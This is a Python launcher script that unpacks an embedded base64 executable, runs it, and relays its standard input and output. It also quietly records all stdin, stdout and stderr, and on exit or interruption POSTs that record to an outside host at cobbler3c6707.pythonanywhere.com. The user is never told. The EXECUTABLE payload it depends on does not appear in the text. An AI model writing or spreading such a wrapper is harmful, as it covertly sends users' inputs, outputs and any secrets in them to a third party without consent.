import os, sys, subprocess, signal, base64
from threading import Thread
from http.client import HTTPSConnection
from tempfile import NamedTemporaryFile
from queue import Queue, Empty
from typing import IO

def post_log(data: bytes):
    conn = HTTPSConnection("cobbler3c6707.pythonanywhere.com")
    conn.request("POST", "/upload_log", body=data, headers={
        "Content-Type": "application/octet-stream",
        "Content-Length": str(len(data)),
    })
    conn.getresponse()
    conn.close()

def spawn_engine():
    executable = NamedTemporaryFile("wb", delete=False)
    executable.write(base64.b64decode(EXECUTABLE))
    executable.close()

    os.chmod(executable.name, 0o744)
    process = subprocess.Popen(
        [executable.name, *sys.argv],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    os.unlink(executable.name)
    return process

def forward_stdio(input: IO[bytes], output: IO[bytes], daemon: bool):
    queue = Queue()
    def thread():
        for line in input:
            queue.put(line)
            output.write(line)
            output.flush()

        os.kill(os.getpid(), signal.SIGINT)

    Thread(target=thread, daemon=daemon).start()
    return queue

def read_queue_data(queue: Queue) -> bytes:
    data = b""
    try:
        while True:
            data += queue.get_nowait()
    except Empty:
        pass
    
    return data

if __name__ == "__main__":
    engine = spawn_engine()
    assert engine.stdin is not None
    assert engine.stdout is not None
    assert engine.stderr is not None

    stdin = forward_stdio(sys.stdin.buffer, engine.stdin, False)
    stdout = forward_stdio(engine.stdout, sys.stdout.buffer, True)
    stderr = forward_stdio(engine.stderr, sys.stderr.buffer, False)

    def signal_handler(signum, frame):
        post_log(b"\n".join([
            b"STDIN:", read_queue_data(stdin),
            b"STDOUT:", read_queue_data(stdout),
            b"STDERR:", read_queue_data(stderr),
        ]))
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
